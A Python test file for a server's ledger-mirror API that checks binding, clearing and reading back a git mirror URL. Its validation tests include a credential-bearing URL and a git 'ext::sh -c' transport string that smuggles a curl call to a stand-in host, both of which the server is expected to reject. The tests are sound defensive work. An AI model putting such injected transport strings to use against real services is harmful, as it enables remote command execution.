"""The served doors onto the ledger mirror: bind it, clear it, orient on it."""

from __future__ import annotations

import subprocess
from pathlib import Path
from typing import Any

from fastapi.testclient import TestClient

from cruxible_core.governance.keys import generate_client_principal_key
from cruxible_core.server.registry import get_registry


def _bare(path: Path) -> Path:
    subprocess.run(["git", "init", "--bare", "-q", "--object-format=sha1", str(path)], check=True)
    return path


def _mirror_url(client: TestClient, instance_id: str) -> str | None:
    response = client.get(f"/api/v1/{instance_id}/orient")
    assert response.status_code == 200, response.text
    return response.json().get("mirror_url")


def _bind(client: TestClient, instance_id: str, remote: Path) -> Any:
    """Bind a mirror: it cannot be called back, so preview it, then commit that preview."""

    url = f"/api/v1/{instance_id}/ledger/mirror"
    preview = client.post(url, json={"url": str(remote)})
    assert preview.status_code == 200, preview.text
    assert preview.json()["status"] == "would_publish"
    return client.post(
        url,
        json={
            "url": str(remote),
            "dry_run": False,
            "at": preview.json()["coordinate"]["git_oid"],
        },
    )


def test_setting_a_mirror_publishes_and_reads_back(
    tmp_path: Path,
    playbill_http: tuple[TestClient, str, Path],
) -> None:
    client, instance_id, _reviewer = playbill_http
    remote = _bare(tmp_path / "mirror.git")

    bound = _bind(client, instance_id, remote)

    assert bound.status_code == 200, bound.text
    assert bound.json()["status"] == "current"
    assert bound.json()["mirror_url"] == str(remote)
    assert _mirror_url(client, instance_id) == str(remote)


def test_clearing_previews_then_unbinds_and_repeats_as_a_no_op(
    tmp_path: Path,
    playbill_http: tuple[TestClient, str, Path],
) -> None:
    client, instance_id, _reviewer = playbill_http
    url = f"/api/v1/{instance_id}/ledger/mirror/clear"
    nothing = client.post(url, json={})
    assert nothing.status_code == 200, nothing.text
    assert nothing.json()["status"] == "already_clear"
    remote = _bare(tmp_path / "mirror.git")
    assert _bind(client, instance_id, remote).status_code == 200

    preview = client.post(url, json={"dry_run": True})
    assert preview.status_code == 200, preview.text
    assert preview.json()["status"] == "would_clear"
    assert preview.json()["previous_mirror_url"] == str(remote)
    assert _mirror_url(client, instance_id) == str(remote)

    cleared = client.post(url, json={})
    assert cleared.status_code == 200, cleared.text
    assert cleared.json()["status"] == "cleared"
    assert cleared.json()["previous_mirror_url"] == str(remote)
    assert _mirror_url(client, instance_id) is None
    publish = client.post(f"/api/v1/{instance_id}/ledger/publish", json={"timeout": 0})
    assert publish.status_code == 400, publish.text
    assert "cruxible.ledger.mirror_unset" in publish.text


def test_a_credential_bearing_url_never_reaches_the_descriptor(
    playbill_http: tuple[TestClient, str, Path],
) -> None:
    client, instance_id, _reviewer = playbill_http

    response = client.post(
        f"/api/v1/{instance_id}/ledger/mirror",
        json={"url": "https://x-access-token:secret@forge.invalid/ledger.git"},
    )

    assert response.status_code == 400, response.text
    assert "cruxible.ledger.mirror_url_invalid" in response.text
    assert _mirror_url(client, instance_id) is None


def test_orientation_carries_the_mirror_url_without_a_second_round_trip(
    tmp_path: Path,
    playbill_http: tuple[TestClient, str, Path],
) -> None:
    client, instance_id, _reviewer = playbill_http
    remote = _bare(tmp_path / "mirror.git")
    assert _bind(client, instance_id, remote).status_code == 200

    response = client.get(f"/api/v1/{instance_id}/orient")

    assert response.status_code == 200, response.text
    assert response.json()["mirror_url"] == str(remote)


def test_init_binds_the_mirror_during_bootstrap(
    tmp_path: Path,
    playbill_http: tuple[TestClient, str, Path],
) -> None:
    """The bootstrap option exists so no write happens before the remote is bound."""

    client, _instance_id, _reviewer = playbill_http
    remote = _bare(tmp_path / "init-mirror.git")
    second = get_registry().create_governed_instance_with_id("inst_playbill_mirror_init")
    managed = Path(second.record.location)
    owner = generate_client_principal_key(
        tmp_path / "second-owner-custody",
        principal_id="operator",
        kind="ordinary",
        forbidden_roots=(managed,),
    )

    initialized = client.post(
        f"/api/v1/{second.record.instance_id}/init",
        json={
            "principals": [owner.principal.model_dump(mode="json")],
            "mirror_url": str(remote),
        },
    )

    assert initialized.status_code == 200, initialized.text
    assert _mirror_url(client, second.record.instance_id) == str(remote)


def test_init_refuses_a_malformed_mirror_before_any_state_exists(
    tmp_path: Path,
    playbill_http: tuple[TestClient, str, Path],
) -> None:
    client, _instance_id, _reviewer = playbill_http
    third = get_registry().create_governed_instance_with_id("inst_playbill_mirror_bad")
    managed = Path(third.record.location)
    owner = generate_client_principal_key(
        tmp_path / "third-owner-custody",
        principal_id="operator",
        kind="ordinary",
        forbidden_roots=(managed,),
    )

    refused = client.post(
        f"/api/v1/{third.record.instance_id}/init",
        json={
            "principals": [owner.principal.model_dump(mode="json")],
            "mirror_url": "ext::sh -c 'curl evil'",
        },
    )

    assert refused.status_code == 400, refused.text
    assert "cruxible.ledger.mirror_url_invalid" in refused.text
    assert not (managed / "instance.json").exists()
